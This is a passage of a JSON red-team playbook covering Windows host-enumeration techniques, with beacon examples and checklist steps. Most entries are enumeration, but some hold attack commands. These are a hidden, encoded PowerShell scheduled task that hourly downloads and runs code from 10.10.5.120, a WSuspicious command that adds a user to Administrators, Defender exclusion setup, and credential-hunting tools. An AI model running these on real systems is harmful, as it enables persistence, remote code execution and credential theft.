                "description": "List local groups and their members to identify administrative roles or shared accounts. Cross-check with standard configurations.",
                "requirements": {},
                "results": [
                    "LOCAL USER+GROUPS:GROUPS ENUMERATED"
                ]
            },
            {
                "id": "f2c2b2f6-1e04-4867-a3f1-01645651cf46",
                "name": "Validate Group Memberships",
                "description": "Inspect group memberships for anomalies such as unauthorized accounts in privileged groups. Document findings for further analysis.",
                "requirements": {},
                "results": [
                    "LOCAL USER+GROUPS:MEMBERSHIPS VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "a3d6c2ea-a7cb-49c9-9119-8d27f9017fed",
        "name": "Logged In Users",
        "phase": "03. Host Enumeration",
        "ttp": "T1033",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc"
        ],
        "steps": [
            {
                "id": "f28e89b8-0462-4615-91a5-f13f77f6233d",
                "name": "List Currently Logged-In Users",
                "description": "Query the system to list all currently logged-in users. Focus on interactive sessions and remote logins.",
                "requirements": {},
                "results": [
                    "LOGGED IN USERS:LISTED"
                ]
            },
            {
                "id": "49e7509c-5a1d-4bf8-bfea-a785325c0cac",
                "name": "Analyze User Sessions",
                "description": "Inspect session details such as login times, session types, and active processes. Identify anomalies such as long-running sessions or suspicious activity.",
                "requirements": {},
                "results": [
                    "LOGGED IN USERS:SESSIONS ANALYZED"
                ]
            },
            {
                "id": "c51b647e-ea97-40eb-b9a1-287b1fe62695",
                "name": "Document User Activity",
                "description": "Record observed user activities, including accessed files and executed commands. Correlate findings with known user roles and responsibilities.",
                "requirements": {},
                "results": [
                    "LOGGED IN USERS:ACTIVITY DOCUMENTED"
                ]
            }
        ]
    },
    {
        "id": "cf173ad9-6f8b-47a0-8190-ebb7779928dd",
        "name": "Sensitive Files",
        "phase": "03. Host Enumeration",
        "ttp": "T1005",
        "external": false,
        "description": "Identify files containing plain text passwords",
        "content": "# Sensitve Files\n\n## Tools\n########\n########\n\n## [[SessionGopher]]\n```ps\nLocally\n. .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n\nRemote\nhttps://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Target 10.10.10.10 -u domain.com\\adm-arvanaghi -p s3cr3tP@ss -o\n```\n\n## [[wmic]]\nSearch files containing 'password' in the name\n```cmd\nwmic DATAFILE where \"drive='C:' AND Name like '%password%'\" GET Name,readable,size /VALUE\n```",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerView",
            "wmic",
            "SessionGopher"
        ],
        "steps": [
            {
                "id": "6cfc441a-95c7-4c8c-ad16-df2d4dbda3e2",
                "name": "Search for Sensitive File Patterns",
                "description": "Perform a targeted search for files with names or extensions indicating sensitive data. Focus on keywords such as 'password', 'config', or 'credentials'.",
                "requirements": {},
                "results": [
                    "SENSITIVE FILES:PATTERNS IDENTIFIED"
                ]
            },
            {
                "id": "7a15bf87-af40-4f23-8039-6009b8bbf454",
                "name": "Inspect File Metadata",
                "description": "Extract and analyze metadata from identified files. Review file authorship, creation timestamps, and modification history.",
                "requirements": {},
                "results": [
                    "SENSITIVE FILES:METADATA ANALYZED"
                ]
            },
            {
                "id": "929bf3ca-114b-4062-9bb2-25c750121d3a",
                "name": "Validate File Contents",
                "description": "Open and inspect the contents of the files to confirm the presence of sensitive data. Prioritize plaintext credentials or configuration data.",
                "requirements": {},
                "results": [
                    "SENSITIVE FILES:CONTENTS VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "7c23ce11-7efc-448c-8c65-11faf0381a92",
        "name": "Web Proxies",
        "phase": "03. Host Enumeration",
        "ttp": "T0000",
        "external": false,
        "description": "Identify web proxies which could block downloads or exfiltrations",
        "content": "# Web Proxies\nReason:\n- Filtering & Monitoring\n- Performance through caching\n- Security (blocking sites and authentication)\n\nIdentify a web proxy via:\n* Groups\n* Seatbelt\n* HTTP header: X-Forwarded-For\n\n\n## Tools\n########\n########\n\n## [[Net]]\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> run net user john /domain\nThe request will be processed at a domain controller for domain edu.evil.corp.\n[...snip...]\n\nGlobal Group memberships     *Domain Users         *Roaming Users        \n                             *Developers           *Proxy Users\n``````\n\n## [[Seatbelt]]\nInternet Settings\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe InternetSettings\n\n  HKCU                       ProxyEnable : 1\n  HKCU                     ProxyOverride : ;local\n  HKCU                       ProxyServer : squid.edu.evil.corp:3128\n``````",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Net",
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "80fbebb7-a817-448e-87ad-aa5a717387b2",
                "name": "Execute Key Action for Technique",
                "description": "Perform the primary action required to implement the Web Proxies technique.",
                "requirements": {},
                "results": [
                    "WEB PROXIES:ACTION:COMPLETED"
                ]
            },
            {
                "id": "8a0633f5-c1b3-4551-93d5-d862198271a8",
                "name": "Validate Technique Success",
                "description": "Ensure that the Web Proxies technique has been implemented successfully and produces the intended results.",
                "requirements": {},
                "results": [
                    "WEB PROXIES:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "3271fc61-147c-498a-bc97-a33dad5d2862",
        "name": "Event Forwarding",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.002",
        "external": false,
        "description": "Identify events being forwarded",
        "content": "## Tools\n########\n########",
        "category": "Auditing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "d4a5f355-6cdb-45df-b2c8-9a8f611050df",
                "name": "Enumerate Event Forwarding Configurations",
                "description": "Identify and enumerate event forwarding configurations on the target system. Query the 'Windows Event Forwarding' subscriptions or equivalent configurations using administrative tools. Check for event source, target collector, and filtering rules.",
                "requirements": {},
                "results": [
                    "EVENT FORWARDING:CONFIGURATIONS ENUMERATED"
                ]
            },
            {
                "id": "2f024aa4-819a-4245-b100-7d98909193b1",
                "name": "Analyze Forwarded Events",
                "description": "Inspect logs for forwarded events stored on the collector machine or in cloud services. Analyze critical event types such as failed login attempts, privilege escalation attempts, and configuration changes. Document unusual patterns or excessive logging rates.",
                "requirements": {},
                "results": [
                    "EVENT FORWARDING:EVENTS ANALYZED"
                ]
            },
            {
                "id": "36c3079d-fda1-4322-bd08-c44ae49588b7",
                "name": "Validate Event Forwarding Mechanisms",
                "description": "Test the end-to-end functionality of the event forwarding setup. Simulate specific event types (e.g., account lockouts) and verify that they are forwarded and logged correctly on the collector. Identify delays, loss, or misconfigurations in the process.",
                "requirements": {},
                "results": [
                    "EVENT FORWARDING:MECHANISMS VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "248fe325-396d-4c4e-9243-323f435e5ca9",
        "name": "Remote Users",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify Users Remotely",
        "content": "Technique Remote Users involves specific methods related to Identify Users Remotely.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "749f63ba-3814-4f6a-b1a3-33cf49f54413",
                "name": "Enumerate Remote User Accounts",
                "description": "Identify remote user accounts connected to the system. Focus on RDP, VPN, or other remote access mechanisms.",
                "requirements": {},
                "results": [
                    "REMOTE USERS:ACCOUNTS ENUMERATED"
                ]
            },
            {
                "id": "4ba70c5e-0023-4ac8-9d60-eeca8e8715f1",
                "name": "Analyze Remote Login Sessions",
                "description": "Inspect remote login session logs for details such as timestamps, session durations, and originating IPs. Correlate with user account information.",
                "requirements": {},
                "results": [
                    "REMOTE USERS:SESSIONS ANALYZED"
                ]
            },
            {
                "id": "e7d201f0-5ae1-43f9-bde8-72cee7306bde",
                "name": "Validate Remote User Activity",
                "description": "Cross-check remote user activity with known user roles and permissions. Document anomalies or unauthorized access attempts.",
                "requirements": {},
                "results": [
                    "REMOTE USERS:ACTIVITY VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "248fe325-396d-4c4e-9243-323fb35e5ca9",
        "name": "PowerShell Logging",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify PowerShell logging",
        "content": "## Receipt\n1. #get_powershell_logging\n\n## Tools\n########\n########\n\n## Script Block Logging\nIf the environment has script block logging enabled, even if we are obfuscating our PowerShell code, before it\u00e2\u20ac\u2122s executed by the PowerShell engine, it\u00e2\u20ac\u2122s going to be de- obfuscated and logged to the event log in 4104.\n\n## System-wide transcript file\nIf the environment has 'system-wide transcript file' enabled, a share on the network will exist where everything typed in PowerShell (transcript file) will be sent to that network share.\n\n#get_powershell_logging\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n```",
        "category": "Auditing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "reg",
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "e067de87-489e-4dd4-93fd-9691b06bd656",
                "name": "Query PowerShell Logging Settings",
                "description": "Inspect the registry to identify PowerShell logging configurations. Focus on Script Block Logging, Module Logging, and Transcription settings.",
                "requirements": {},
                "results": [
                    "POWERSHELL LOGGING:SETTINGS QUERIED"
                ]
            },
            {
                "id": "2cd259d3-ac8b-40e2-b674-3e94f69eebc9",
                "name": "Analyze Event Logs for PowerShell Activity",
                "description": "Inspect Windows Event Logs (e.g., ID 4104) for recorded PowerShell script execution. Document any instances of obfuscated or suspicious commands.",
                "requirements": {},
                "results": [
                    "POWERSHELL LOGGING:EVENTS ANALYZED"
                ]
            },
            {
                "id": "3c091d80-acaf-4713-95a1-ff2c13576d7f",
                "name": "Validate Transcript File Configuration",
                "description": "Check for system-wide transcript file settings. Identify the location of shared directories used for storing PowerShell transcripts.",
                "requirements": {},
                "results": [
                    "POWERSHELL LOGGING:TRANSCRIPT CONFIGURATION VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "9ab0226d-0d10-4d57-a53a-7419798545d5",
        "name": "Windows Audit Policies",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.002",
        "external": false,
        "description": "Identify Windows Audit Policies",
        "content": "## Tools\n########\n########",
        "category": "Auditing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "abe63957-8514-4976-96b2-8de2043d7dc7",
                "name": "Query Audit Policy Settings",
                "description": "Inspect the local or domain-level audit policy configurations. Focus on settings for account logon events, object access, and privilege use.",
                "requirements": {},
                "results": [
                    "WINDOWS AUDIT POLICIES:SETTINGS QUERIED"
                ]
            },
            {
                "id": "25702988-dbe0-4a08-9876-36e79857eae3",
                "name": "Analyze Audit Logs",
                "description": "Review the Security Event Log for recorded audit events. Identify patterns such as failed logon attempts or unauthorized file access.",
                "requirements": {},
                "results": [
                    "WINDOWS AUDIT POLICIES:LOGS ANALYZED"
                ]
            },
            {
                "id": "7a9f21bd-5848-4021-8e8a-4b02c118a6eb",
                "name": "Validate Audit Policy Effectiveness",
                "description": "Simulate events such as failed logons to test whether they are logged correctly. Ensure critical events are recorded as per the configured policy.",
                "requirements": {},
                "results": [
                    "WINDOWS AUDIT POLICIES:EFFECTIVENESS VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "d95f1a12-09f0-49c3-ac95-45a7b6de5e5c",
        "name": "AV-Exclusions",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.001",
        "external": false,
        "description": "Short description for AV-Exclusions",
        "content": "# Exlcusions\nPretty much every antivirus solution allows you to define exclusions to on-demand and real-time scanning.  Windows Defender allows admins to add exclusions via GPO, or locally on a single machine.\n\nThe three flavours are:\n\n-   Extension - exclude all files by their file extension.\n-   Path - exclude all files in the given directory.\n-   Process - exclude any file opened by the specified processes.\n\n```beacon\nbeacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*\n\nExclusionExtension : \nExclusionIpAddress : \nExclusionPath : {C:\\Shares\\software}\nExclusionProcess :\n```\n\nIf the exclusions are configured via GPO and you can [[Dump GPOs]] the corresponding Registry.pol file, you can read them with [[GPRegistryPolicyParser]].\n\n## Define Defender Exclusions\n```powershell\nSet-MpPreference -ExclusionPath \"<path>\"\n```\n\n## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "89c84d2f-cd84-4c92-a8cd-fc758355191a",
                "name": "Query AV Exclusion Settings",
                "description": "Inspect antivirus exclusion settings by querying system configurations and registry keys. For Windows, check the registry paths such as `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions`. Identify paths, processes, or file extensions excluded from scanning.",
                "requirements": {},
                "results": [
                    "AV-EXCLUSIONS:SETTINGS QUERIED"
                ]
            },
            {
                "id": "825e07a4-eeab-4793-a312-cbef9e360b21",
                "name": "Validate Exclusion Effectiveness",
                "description": "Test the effectiveness of exclusions by creating test files in excluded directories or running excluded processes. Use known benign files to confirm whether the antivirus detects or ignores them based on configured exclusions.",
                "requirements": {},
                "results": [
                    "AV-EXCLUSIONS:EFFECTIVENESS VALIDATED"
                ]
            },
            {
                "id": "5aae6240-2f29-444b-ab62-10248c95887c",
                "name": "Analyze GPO-Based Exclusions",
                "description": "If exclusions are configured via Group Policy, use administrative tools like `gpedit.msc` or `RSOP.msc` to review policies. Cross-reference these policies with registry settings to ensure consistency and document the applied exclusions.",
                "requirements": {},
                "results": [
                    "AV-EXCLUSIONS:GPO EXCLUSIONS ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "29fd5ca7-ad73-4a53-948c-f450757c8612",
        "name": "LLMNR",
        "phase": "03. Host Enumeration",
        "ttp": "T1557.001",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "Returns 0 if disabled.\n`$(Get-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\" -name EnableMulticast).EnableMulticast`\n\nIf it returns an error then it is not set.n`Get-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\" -name EnableMulticast`## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "76176010-ac9f-4262-9ded-fc51656d9f8f",
                "name": "Query LLMNR Configuration",
                "description": "Inspect the system's LLMNR configuration by querying the registry key `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient`. Verify if LLMNR is enabled or disabled and document its current state.",
                "requirements": {},
                "results": [
                    "LLMNR:CONFIGURATION QUERIED"
                ]
            },
            {
                "id": "d76eda6c-7d6d-40ee-8269-92ef2a700b58",
                "name": "Validate LLMNR Responses",
                "description": "Send crafted LLMNR queries to the local network using standard networking tools or scripts. Capture and analyze the responses to identify systems actively responding to the queries and their IP addresses.",
                "requirements": {},
                "results": [
                    "LLMNR:RESPONSES VALIDATED"
                ]
            },
            {
                "id": "f8ac0e87-849e-4cb5-b677-cdec914a25f4",
                "name": "Assess LLMNR Misconfigurations",
                "description": "Review the responses from LLMNR queries to detect misconfigurations. Focus on systems revealing sensitive information, such as internal hostnames, file shares, or login prompts.",
                "requirements": {},
                "results": [
                    "LLMNR:MISCONFIGURATIONS ASSESSED"
                ]
            }
        ]
    },
    {
        "id": "4f26577f-fc57-4d99-98ba-d968895d2c23",
        "name": "PowerShell-Version",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
        "content": "\n## [[reg]]\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion\n```",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [
            "reg"
        ],
        "steps": [
            {
                "id": "c84eafb0-f6e9-4b31-a3a3-851f32c8c79c",
                "name": "Query Installed PowerShell Versions",
                "description": "Inspect the registry to query installed PowerShell versions. Check keys such as `HKLM\\SOFTWARE\\Microsoft\\PowerShell\\<version>` for the `PowerShellVersion` value.",
                "requirements": {},
                "results": [
                    "POWERSHELL-VERSION:VERSIONS IDENTIFIED"
                ]
            },
            {
                "id": "690ce06f-af6d-4fdc-867f-a35959500d72",
                "name": "Analyze Version Compatibility",
                "description": "Verify the compatibility of identified PowerShell versions with operational requirements. Focus on deprecated versions or those lacking security updates.",
                "requirements": {},
                "results": [
                    "POWERSHELL-VERSION:COMPATIBILITY ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "b881fd94-ac61-43d6-a3fd-148439b99ebb",
        "name": "WDigest",
        "phase": "03. Host Enumeration",
        "ttp": "T1003",
        "external": false,
        "description": "Identify if WDigest is still enabled, allowing an attacker to steal plaintext credentials",
        "content": "If active, plain-text passwords are stored in LSASS (Local Security Authority Subsystem Service).\n> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n\n\n## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "3f41a515-2960-460c-a351-35992c253f03",
                "name": "Query WDigest Configuration",
                "description": "Inspect the registry at `HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest` for the `UseLogonCredential` value. Identify if plaintext password storage is enabled.",
                "requirements": {},
                "results": [
                    "WDIGEST:CONFIGURATION QUERIED"
                ]
            },
            {
                "id": "10156e40-f4aa-450a-baf6-5b040ea84f66",
                "name": "Validate WDigest State",
                "description": "Verify whether WDigest is actively storing plaintext credentials. Log findings for further analysis and remediation if necessary.",
                "requirements": {},
                "results": [
                    "WDIGEST:STATE VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "5a744511-a3d3-4bde-a71c-bfcd5af8f54f",
        "name": "WSUS",
        "phase": "03. Host Enumeration",
        "ttp": "T1546",
        "external": false,
        "description": "Identify if the Windows Update Service is running via the insecure protocol http",
        "content": "1. Gather infos\n>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\n2. Needs to be 1\n>HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer\n\n## Tools\n########\n########\n\n## [[Seatbelt]]\n[[Protections/AppLocker]] [[AV-EDR]] [[Credential Guard]] [[Windows Audit Policies]] [[PowerShell Logging]] [[Event Forwarding]] [[Misconfigurations/WSUS]]\n## Get systems environment\n>execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe -group=system -outputfile=\"file.txt\"\n\n## [[WSuspicious]]\n[[Misconfigurations/WSUS]]\n1. Add user to Admin and drop file as confirmation:\n    ```bash\n    .\\WSuspicious.exe /command:\" -accepteula -s -d cmd /c \"\"echo eop_executed > C:\\\\eop_poc.txt; net localgroup Administratoren ext_ecorp_user /add\"\"\" /autoinstall\n    ```",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [
            "WSuspicious",
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "fb7ad207-117b-4cb6-a785-d310888a3196",
                "name": "Query WSUS Server Configuration",
                "description": "Inspect the registry to identify the configured WSUS server. Query keys such as `HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate` for the `WUServer` value.",
                "requirements": {},
                "results": [
                    "WSUS:SERVER CONFIGURATION QUERIED"
                ]
            },
            {
                "id": "771d814a-cfeb-4fee-ae33-2e43ea1a1680",
                "name": "Validate Protocol Configuration",
                "description": "Check if the WSUS server is communicating over HTTP instead of HTTPS. Identify potential risks associated with insecure protocol usage.",
                "requirements": {},
                "results": [
                    "WSUS:PROTOCOL VALIDATED"
                ]
            },
            {
                "id": "9da4ba4e-9957-4248-bb28-882d21d17943",
                "name": "Analyze WSUS Misconfigurations",
                "description": "Review WSUS settings for common misconfigurations, such as user access levels or unauthenticated updates. Document findings for further remediation.",
                "requirements": {},
                "results": [
                    "WSUS:MISCONFIGURATIONS ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "b8d9f9e1-c296-4783-8664-072899e37a4b",
        "name": "Scheduled Tasks",
        "phase": "03. Host Enumeration",
        "ttp": "T1053",
        "external": false,
        "description": "Identify scheduled tasks",
        "content": "## Tools\n########\n########\n\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Task Scheduler\nor `taskschd.msc`\n\n## [[SharPersist]]\nCreate a scheduled task with:\n* Powershell x64 bit\n* Name: Updater\n* hourly execute\n``````powershell\n$str = 'IEX ((new-object net.webclient).downloadstring(\"http://10.10.5.120/a\"))'\n\n[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))\n\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==\" -n \"Updater\" -m add -o hourly\n``````",
        "category": "Priv Esc",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "SharPersist"
        ],
        "steps": [
            {
                "id": "f0d39340-f09d-4c2c-8f96-ac117437cfe2",
                "name": "Enumerate Existing Scheduled Tasks",
                "description": "Query the system for all scheduled tasks using built-in tools or system APIs. Focus on tasks that are user-created or run with elevated privileges.",
                "requirements": {},
                "results": [
                    "SCHEDULED TASKS:ENUMERATED"
                ]
            },
            {
                "id": "4022abde-8864-4223-8c08-22ee9a3ff32c",
                "name": "Inspect Task Actions and Triggers",
                "description": "Analyze the actions and triggers associated with each task. Identify tasks configured to run scripts, executables, or commands.",
                "requirements": {},
                "results": [
                    "SCHEDULED TASKS:ACTIONS INSPECTED"
                ]
            },
            {
                "id": "e8a5a7f3-377d-4934-8dca-5d074651c3d0",
                "name": "Validate Task Execution Settings",
                "description": "Verify the permissions and execution conditions for identified tasks. Document anomalies such as tasks configured to bypass security checks.",
                "requirements": {},
                "results": [
                    "SCHEDULED TASKS:EXECUTION VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "48943382-ec1c-42e0-9b24-1c1d460f3879",
        "name": "Services",
        "phase": "03. Host Enumeration",
        "ttp": "T1543.003",
        "external": false,
        "description": "Identify services",
        "content": "## Tools\n########\n########\n\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Services\nor `services.msc`\n\n## [[sc]]\n* Start service  \n`sc [<ServerName>] start <ServiceName>`\n* Stop dervice\n`sc [<ServerName>] stop <ServiceName>` \n* List all services\n`sc queryex type=service state=all`\n* List service names only\n`sc queryex type=service state=all | find /i \"SERVICE_NAME:\"`\n* Search for specific service\n`sc queryex type=service state=all | find /i \"SERVICE_NAME: myService\"`\n* Get security identifier, [read more](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)  \n`sc.exe sdshow [service_short_name]`",
        "category": "Priv Esc",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "sc"
        ],
        "steps": [
            {
                "id": "e8f95dce-66d0-4f0c-88e0-ec5da4210ec7",
                "name": "Enumerate System Services",
                "description": "List all services running on the target system using system APIs or administrative commands. Focus on identifying misconfigured services or those running with elevated privileges.",
                "requirements": {},
                "results": [
                    "SERVICES:ENUMERATED"
                ]
            },
            {
                "id": "947a3a30-4cac-42b8-8057-24d393c3b2c9",
                "name": "Inspect Service Configurations",
                "description": "Analyze configurations of identified services, including startup types, executable paths, and permissions. Document anomalies such as writable service paths or misconfigured permissions.",
                "requirements": {},
                "results": [
                    "SERVICES:CONFIGURATIONS INSPECTED"
                ]
            },
            {
                "id": "f3b02350-f79b-4852-ad28-89803f154f9b",
                "name": "Validate Service Integrity",
                "description": "Check the integrity of critical services to ensure they are not tampered with. Focus on hashes, service executables, and dependencies.",
                "requirements": {},
                "results": [
                    "SERVICES:INTEGRITY VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "90eb48f9-0cad-487c-bc75-236088805749",
        "name": "AppLocker",
        "phase": "03. Host Enumeration",
        "ttp": "M1038",
        "external": false,
        "description": "Short description for AppLocker",
        "content": "## Identify \n1. Via registry `HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2`.\n2. [[Group Policy (GPO)#Identify]]\n    ```gpo\n    KeyName     : Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\921cc481-6e17-4653-8f75-050b80acca20\n    ValueName   : Value\n    ValueType   : REG_SZ\n    ValueLength : 736\n    ValueData   : <FilePathRule Id=\"921cc481-6e17-4653-8f75-050b80acca20\"\n                    Name=\"(Default Rule) All files located in the Program Files folder\"\n                    Description=\"Allows members of the Everyone group to run applications that are located in the Program Files folder.\"\n                    UserOrGroupSid=\"S-1-1-0\"\n                    Action=\"Allow\">\n    <Conditions>\n    <FilePathCondition Path=\"%PROGRAMFILES%\\*\"/>\n    </Conditions>\n    </FilePathRule>\n    ```\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "8014192e-5e27-497c-bb2f-683a84906303",
                "name": "Identify AppLocker Policies",
                "description": "Query the registry at `HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2` to identify configured AppLocker policies. Document active rules and their scope.",
                "requirements": {},
                "results": [
                    "APPLOCKER:POLICIES IDENTIFIED"
                ]
            },
            {
                "id": "8e09a0b9-3a27-4a2d-ae02-9a24cccbdb0b",
                "name": "Query AppLocker Event Logs",
                "description": "Inspect the Event Viewer logs under `Applications and Services Logs > Microsoft > Windows > AppLocker`. Look for entries related to rule enforcement, execution attempts, and policy changes.",
                "requirements": {},
                "results": [
                    "APPLOCKER:EVENT LOGS QUERIED"
                ]
            },
            {
                "id": "a074727d-c5f2-459c-a695-218154955871",
                "name": "Verify AppLocker Rules via Administrative Tools",
                "description": "Use administrative tools like `secpol.msc` or `gpresult` to query active AppLocker rules. Focus on rules applied to different user groups or execution paths.",
                "requirements": {},
                "results": [
                    "APPLOCKER:RULES VERIFIED"
                ]
            },
            {
                "id": "5ccbc7be-5a67-42c7-84f4-1f13e15c9eb0",
                "name": "Analyze Rule Effectiveness",
                "description": "Review AppLocker rules for potential bypasses or misconfigurations. Test execution of binaries from allowed paths to validate rule enforcement.",
                "requirements": {},
                "results": [
                    "APPLOCKER:RULES ANALYZED"
                ]
            },
            {
                "id": "3ac135d6-59e3-4d34-8f2c-236395a4e0fa",
                "name": "Validate Enforcement Behavior",
                "description": "Simulate rule violations by attempting to execute restricted applications. Log findings on rule enforcement and identify any gaps.",
                "requirements": {},
                "results": [
                    "APPLOCKER:BEHAVIOR VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "9c7427cc-879e-40e2-a2db-6803d8b6c07c",
        "name": "Attack Surface Reduction Rules (ASR)",
        "phase": "03. Host Enumeration",
        "ttp": "M1040",
        "external": false,
        "description": "Checking for ASR\nCan be easily done with Situational Awareness BOF reg_query_recursive in Cobalt Strike:\n\n\u00b4reg_query_recursive HKLM Software\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\nreg_query_recursive HKLM Software\\Policies\\Microsoft\\Windows Defender\\Policy Manager\u00b4\n\n\u2139\ufe0f The second query should give you some GUIDs if ASR is enabled, under the registry key ASRRules. The format will be \u2018<GUID1>=1|<GUID2>=0'\u2026 This means that GUID1 is enabled (=1), GUID2 is disabled (=0). If the value is 2 (=2), it means the ASR rule is in audit mode, so not blocking. See the GUID reference table below to see the GUID mapping to ASR rules.\n\nASR Rule to GUID Mapping\nYou can use this table as a reference for different GUIDs after you found which ASR rules are enabled on a host system, if it is enabled. Source of this table: Source\n\n|Rule\t|GUID|\n|----------|-------------|\n|Block abuse of exploited vulnerable signed drivers\t|56a863a9-875e-4185-98a7-b882c64b5ce5|\n|Block Adobe Reader from creating child processes\t|7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c|\n|Block all Office applications from creating child processes\t|d4f940ab-401b-4efc-aadc-ad5f3c50688a|\n|Block credential stealing from the Windows local security authority subsystem (lsass.exe)\t|9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2|\n|Block executable content from email client and webmail\t|be9ba2d9-53ea-4cdc-84e5-9b1eeee46550|\n|Block executable files from running unless they meet a prevalence, age, or trusted list criterion\t|01443614-cd74-433a-b99e-2ecdc07bfc25|\n|Block execution of potentially obfuscated scripts\t|5beb7efe-fd9a-4556-801d-275e5ffc04cc|\n|Block JavaScript or VBScript from launching downloaded executable content\t|d3e037e1-3eb8-44c8-a917-57927947596d|\n|Block Office applications from creating executable content\t|3b576869-a4ec-4529-8536-b80a7769e899|\n|Block Office applications from injecting code into other processes\t|75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84|\n|Block Office communication application from creating child 